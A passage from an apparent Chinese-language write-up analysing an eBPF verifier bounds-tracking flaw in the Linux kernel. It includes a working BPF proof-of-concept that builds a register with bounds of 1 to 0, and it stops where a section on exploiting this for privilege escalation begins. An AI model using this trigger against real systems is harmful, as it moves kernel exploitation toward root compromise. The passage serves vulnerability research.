*/</span><br>scalar_min_max_and(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_OR:<br>dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_or(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 */</span><br>scalar_min_max_or(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> BPF_XOR:<br>dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_xor(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 */</span><br>scalar_min_max_xor(dst_reg, &amp;src_reg);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<span class="hljs-comment">//更新边界</span><br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在更新 32 位边界值时开发者认为如果两个寄存器的低 32 位都为 <code>known</code> 那就可以<strong>直接跳过</strong>，因为 64 位时还会进行更新：</p><blockquote><p><code>tnum_subreg_is_const()</code> 会看寄存器的 <code>var_off</code> 的 mask 的低 32 位是否为 0（即全部已知）</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar32_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params"> <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);<br>s32 smin_val = src_reg-&gt;s32_min_value;<br>u32 umax_val = src_reg-&gt;u32_max_value;<br><br><span class="hljs-comment">/* 假设 scalar64_min_max_and 将被调用，</span><br><span class="hljs-comment"> * 因此跳过为已知的 32位情况更新寄存器是安全的.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known)<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>在更新 64 位边界值时若两个寄存器都为 <code>known</code> 就直接调用 <code>__mark_reg_known()</code> <strong>将寄存器标为</strong> <code>known</code> <strong>并直接返回</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">scalar_min_max_and</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> bpf_reg_state *src_reg)</span><br>&#123;<br><span class="hljs-type">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);<br><span class="hljs-type">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);<br>s64 smin_val = src_reg-&gt;smin_value;<br>u64 umax_val = src_reg-&gt;umax_value;<br><br><span class="hljs-keyword">if</span> (src_known &amp;&amp; dst_known) &#123;<br>__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><blockquote><p><code>__mark_reg_known()</code> 其实就是简单的调用 <code>tnum_const()</code> 设置寄存器 <code>var_off</code> 为 <code>known</code> ，并给对应边界赋值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* This helper doesn&#x27;t clear reg-&gt;id */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> ___mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br>reg-&gt;var_off = tnum_const(imm);<br>reg-&gt;smin_value = (s64)imm;<br>reg-&gt;smax_value = (s64)imm;<br>reg-&gt;umin_value = imm;<br>reg-&gt;umax_value = imm;<br><br>reg-&gt;s32_min_value = (s32)imm;<br>reg-&gt;s32_max_value = (s32)imm;<br>reg-&gt;u32_min_value = (u32)imm;<br>reg-&gt;u32_max_value = (u32)imm;<br>&#125;<br><br><span class="hljs-comment">/* 标记一个寄存器的未知部分 (变量偏移或标量值) </span><br><span class="hljs-comment"> * 为已知的值 @imm.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __mark_reg_known(<span class="hljs-keyword">struct</span> bpf_reg_state *reg, u64 imm)<br>&#123;<br><span class="hljs-comment">/* Clear id, off, and union(map_ptr, range) */</span><br><span class="hljs-built_in">memset</span>(((u8 *)reg) + <span class="hljs-keyword">sizeof</span>(reg-&gt;type), <span class="hljs-number">0</span>,<br>       offsetof(<span class="hljs-keyword">struct</span> bpf_reg_state, var_off) - <span class="hljs-keyword">sizeof</span>(reg-&gt;type));<br>___mark_reg_known(reg, imm);<br>&#125;<br><br></code></pre></td></tr></table></figure></blockquote><p>但这样存在一个问题，<strong>若存在一个高 32 位 unknown 的寄存器，则不会调用</strong> <code>__mark_reg_known()</code> <strong>更新 32 位的边界值，而只会更新 64 位边界值</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 我们从 var_off 中获取最小值, 因为其本质上是按位的.</span><br><span class="hljs-comment"> * 我们的最大值为操作数中所有最大值的最小值.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;<br>dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);<br><span class="hljs-keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="hljs-number">0</span> || smin_val &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 在加上负值时会丢失有符号的范围，</span><br><span class="hljs-comment"> * 没人有时间搞这个.  // 译注：原文如此</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = S64_MIN;<br>dst_reg-&gt;smax_value = S64_MAX;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* 两个正值做与还是正值, </span><br><span class="hljs-comment"> * 故可以很安全地将结果转为 s64.</span><br><span class="hljs-comment"> */</span><br>dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;<br>dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;<br>&#125;<br><span class="hljs-comment">/* 我们可能从 var_off 中获取到更多 */</span><br>__update_reg_bounds(dst_reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里笔者举一个非常简单的<del>并且已经在其他各大师傅的漏洞分析的文章里用烂了的</del>例子：</p><ul><li><code>R2 = &#123; .value = 0x1, .mask = 0xffffffff00000000 &#125;;</code> ：该寄存器低 32 位值已知为 1，高 32 位不确定</li><li><code>R3 = &#123; .value = 0x100000002, .mask = 0x0 &#125;;</code> ：该寄存器 64 位值全部已知，为 <code>0x100000002</code></li></ul><p>假如我们将 R2 与 R3 做与运算，在刚进入 switch 时会先调用 <code>tnum_and()</code> 进行计算并将结构保存到 <code>R2-&gt;var_off</code>，由于 R3 全部确定而 R2 的高 32 位不确定，因此运算结果为 <code>&#123; .value = 0x0, .mask = 0x100000000 &#125;</code>，即仅有第 32 位是不确定的</p><p>接下来继续回到 <code>scalar_min_max_and()</code>中，该函数最后会调用 <code>__update_reg_bounds()</code> 对比寄存器的 <code>var_off</code> 并更新边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg32_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_subreg(reg-&gt;var_off);<br><br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;s32_min_value = <span class="hljs-type">max_t</span>(s32, reg-&gt;s32_min_value,<br>var32_off.value | (var32_off.mask &amp; S32_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;s32_max_value = <span class="hljs-type">min_t</span>(s32, reg-&gt;s32_max_value,<br>var32_off.value | (var32_off.mask &amp; S32_MAX));<br>reg-&gt;u32_min_value = <span class="hljs-type">max_t</span>(u32, reg-&gt;u32_min_value, (u32)var32_off.value);<br>reg-&gt;u32_max_value = min(reg-&gt;u32_max_value,<br> (u32)(var32_off.value | var32_off.mask));<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg64_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* min signed is max(sign bit) | min(other bits) */</span><br>reg-&gt;smin_value = <span class="hljs-type">max_t</span>(s64, reg-&gt;smin_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MIN));<br><span class="hljs-comment">/* max signed is min(sign bit) | max(other bits) */</span><br>reg-&gt;smax_value = <span class="hljs-type">min_t</span>(s64, reg-&gt;smax_value,<br>reg-&gt;var_off.value | (reg-&gt;var_off.mask &amp; S64_MAX));<br>reg-&gt;umin_value = max(reg-&gt;umin_value, reg-&gt;var_off.value);<br>reg-&gt;umax_value = min(reg-&gt;umax_value,<br>      reg-&gt;var_off.value | reg-&gt;var_off.mask);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __update_reg_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__update_reg32_bounds(reg);<br>__update_reg64_bounds(reg);<br>&#125;<br></code></pre></td></tr></table></figure><p>计算方法如下：</p><ul><li>最小边界值 &#x3D; 【<code>min_value</code> 、 <code>var_off</code> 已知值】中的最大者</li><li>最大边界值 &#x3D;【 <code>max_value</code> 、 <code>var_off</code> 已知值】中的最小者</li></ul><p>由于 R2 的 32 位初始边界值未经过更新，仍为其原值 <code>1</code>，因此经过该轮计算之后 R2 的<strong>最小值为 1，最大值为 0</strong>，而这显然是不合理的</p><p>回到  <code>adjust_scalar_min_max_vals()</code> 中，其最后也会调用 <code>__update_reg_bounds()</code> 对比寄存器的 <code>var_off</code> 并更新边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">default</span>:<br>mark_reg_unknown(env, regs, insn-&gt;dst_reg);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">/* ALU32 ops are zero extended into 64bit register */</span><br><span class="hljs-keyword">if</span> (alu32)<br>zext_32_to_64(dst_reg);<br><br>__update_reg_bounds(dst_reg);<br>__reg_deduce_bounds(dst_reg);<br>__reg_bound_offset(dst_reg);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>__reg_deduce_bounds()</code> 主要再做一次边界调整校验的工作，这里 32 位与 64 位都用的同一套逻辑：</p><ul><li>若有符号最小值边界大于等于 0 或 有符号最大值边界小于 0 ，则更新有符号最小值边界为有符号与无符号最小值边界中的最大值，并更新有符号最大值边界为有符号与无符号最大值边界中的最小值，之后直接返回</li><li>若无符号最大值边界没有超过有符号范围（最高位不为1），则将有符号最小值设为无符号最小值，有符号最大值设为有符号与无符号最大值中的最小值</li><li>否则，若无符号最小值边界超过有符号范围（最高位为1），则将有符号最小值设为有符号与无符号最小值中的最大值，将有符号最大值设为无符号最大值</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 使用有符号的最小/最大值赋值无符号, 反之亦然 */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg32_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* 从有符号边界中获取符号.</span><br><span class="hljs-comment"> * 若我们无法穿过符号边界，有符号与无符号边界相同，故合并.</span><br><span class="hljs-comment"> * 这在负数情况下也有用，例如：</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 意味着 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;s32_min_value &gt;= <span class="hljs-number">0</span> || reg-&gt;s32_max_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* 从无符号边界中获取边界.  </span><br><span class="hljs-comment"> * 有符号边界穿过了有符号范围，我们必须小心.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_max_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 正数. 我们无法从 smin 获取任何东西, </span><br><span class="hljs-comment"> * 但 smax 是正数，因此是安全的.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value;<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value =<br><span class="hljs-type">min_t</span>(u32, reg-&gt;s32_max_value, reg-&gt;u32_max_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s32)reg-&gt;u32_min_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* 负数.  我们无法从 smax 获取任何东西,</span><br><span class="hljs-comment"> * 但 smin 是负数，因此是安全的.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;s32_min_value = reg-&gt;u32_min_value =<br><span class="hljs-type">max_t</span>(u32, reg-&gt;s32_min_value, reg-&gt;u32_min_value);<br>reg-&gt;s32_max_value = reg-&gt;u32_max_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg64_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-comment">/* Learn sign from signed bounds.</span><br><span class="hljs-comment"> * If we cannot cross the sign boundary, then signed and unsigned bounds</span><br><span class="hljs-comment"> * are the same, so combine.  This works even in the negative case, e.g.</span><br><span class="hljs-comment"> * -3 s&lt;= x s&lt;= -1 implies 0xf...fd u&lt;= x u&lt;= 0xf...ff.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (reg-&gt;smin_value &gt;= <span class="hljs-number">0</span> || reg-&gt;smax_value &lt; <span class="hljs-number">0</span>) &#123;<br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* Learn sign from unsigned bounds.  Signed bounds cross the sign</span><br><span class="hljs-comment"> * boundary, so we must be careful.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> ((s64)reg-&gt;umax_value &gt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Positive.  We can&#x27;t learn anything from the smin, but smax</span><br><span class="hljs-comment"> * is positive, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value;<br>reg-&gt;smax_value = reg-&gt;umax_value = <span class="hljs-type">min_t</span>(u64, reg-&gt;smax_value,<br>  reg-&gt;umax_value);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((s64)reg-&gt;umin_value &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-comment">/* Negative.  We can&#x27;t learn anything from the smax, but smin</span><br><span class="hljs-comment"> * is negative, hence safe.</span><br><span class="hljs-comment"> */</span><br>reg-&gt;smin_value = reg-&gt;umin_value = <span class="hljs-type">max_t</span>(u64, reg-&gt;smin_value,<br>  reg-&gt;umin_value);<br>reg-&gt;smax_value = reg-&gt;umax_value;<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_deduce_bounds(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br>__reg32_deduce_bounds(reg);<br>__reg64_deduce_bounds(reg);<br>&#125;<br><br></code></pre></td></tr></table></figure><p> <code>__reg_bound_offset()</code> 则是基于边界值范围重新计算 <code>var_off</code> 的值：</p><ul><li><code>tnum_range()</code>：取 min 中 min、max 的低位相同位部分，从第一个不同位开始设为未知</li><li><code>tnum_intersect()</code>：取 a、b 的共有已知为 1 的位</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_range</span><span class="hljs-params">(u64 min, u64 max)</span><br>&#123;<br>u64 chi = min ^ max, delta;<br>u8 bits = fls64(chi); <span class="hljs-comment">// 找到为 1 的最低位</span><br><br><span class="hljs-comment">/* 特殊情况， 需要这样因为 1ULL &lt;&lt; 64 是未定义的 */</span><br><span class="hljs-keyword">if</span> (bits &gt; <span class="hljs-number">63</span>)<br><span class="hljs-keyword">return</span> tnum_unknown;<br><span class="hljs-comment">/* 例如若 chi = 4, bits = 3, delta = (1&lt;&lt;3) - 1 = 7.</span><br><span class="hljs-comment"> * 若 chi = 0, bits = 0, delta = (1&lt;&lt;0) - 1 = 0, </span><br><span class="hljs-comment"> *  故我们返回常数 min (因为 min == max).</span><br><span class="hljs-comment"> */</span><br>delta = (<span class="hljs-number">1ULL</span> &lt;&lt; bits) - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> TNUM(min &amp; ~delta, delta);<br>&#125;<br><br><span class="hljs-comment">/* 需要注意的是若 a 与 b 不同意 - 即其一有一个 &#x27;known 1&#x27; 而另一个则</span><br><span class="hljs-comment"> * 有一个 &#x27;known 0&#x27; - 这将为该位返回一个 &#x27;known 1&#x27;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> tnum <span class="hljs-title function_">tnum_intersect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tnum a, <span class="hljs-keyword">struct</span> tnum b)</span><br>&#123;<br>u64 v, mu;<br><br>v = a.value | b.value;<br>mu = a.mask &amp; b.mask;<br><span class="hljs-keyword">return</span> TNUM(v &amp; ~mu, mu);<br>&#125;<br><br><span class="hljs-comment">/* 尝试基于无符号最小/最大值改进 var_off 信息 */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __reg_bound_offset(<span class="hljs-keyword">struct</span> bpf_reg_state *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var64_off</span> =</span> tnum_intersect(reg-&gt;var_off,<br>       tnum_range(reg-&gt;umin_value,<br>  reg-&gt;umax_value));<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tnum</span> <span class="hljs-title">var32_off</span> =</span> tnum_intersect(tnum_subreg(reg-&gt;var_off),<br>tnum_range(reg-&gt;u32_min_value,<br>   reg-&gt;u32_max_value));<br><br>reg-&gt;var_off = tnum_or(tnum_clear_subreg(var64_off), var32_off);<br>&#125;<br></code></pre></td></tr></table></figure><p>这两个操作在这里都不会影响 R2 的值</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>现在我们来构造能够触发该漏洞的两个寄存器 <code>R2 = &#123; .value = 1, mask = 0xffffffff00000000 &#125;</code> 与 <code>R3 = &#123; .value = 0x100000002, mask = 0 &#125;</code>，其中 <code>R3</code> 可以直接通过赋值构造一个 known 的寄存器， <code>R2</code> 需要一半已知一半未知，可以通过 <em>从 map 中取出一个值进行赋值</em> 的方式先构造出一个 unknown 的寄存器，再与 <code>0xffffffff00000000</code> 做 AND 操作使其低 32 位变为 known：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> POC_PROG(__map_fd)                              \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* Load value from map */</span>                       \</span><br><span class="hljs-meta">        BPF_LD_MAP_FD(BPF_REG_9, __map_fd),             \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),            \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),          \</span><br><span class="hljs-meta">        BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),            \</span><br><span class="hljs-meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* if success, r0 will be ptr to value, 0 for failed */</span>              \</span><br><span class="hljs-meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),          \</span><br><span class="hljs-meta">        BPF_EXIT_INSN(),                                \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* load value into r2, make it part-unknown */</span>  \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),   \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_4, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_4, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_4),   \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x1),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* r3 = 0x100000002 */</span>                          \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_3, 0x1),                  \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),          \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, 0x2),         \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* triger the vulnerability */</span>                  \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_2, BPF_REG_3)</span><br></code></pre></td></tr></table></figure><p>把这个程序载入内核过一遍 verifier，简单打印下日志，可以看到<strong>我们确乎构造出了一个最小边界值为 1、最大边界值为 0 的寄存器</strong>：</p><p><img src="https://s2.loli.net/2023/06/02/br1XJgjKeFR6pOq.png" alt="测试 poc"></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02. 漏洞利用"></a>0x02. 漏洞利用</h1><p>接下来我们考虑如何利用这个漏洞完成提权，现在我们有了一个 32 位边界值为 <code>[1，0]</code> 、32位推测值与32位运行时值都为 0 的寄存器，接下来我们考虑如何构造一个<strong>verifier 推测值与运行时值不同的寄存器</strong>，从而继续完成后续利用</p><h2 id="一、构造边界值为-1-0-的寄存器"><a href="#一、构造边界值为-1-0-的寄存器" class="headerlink" 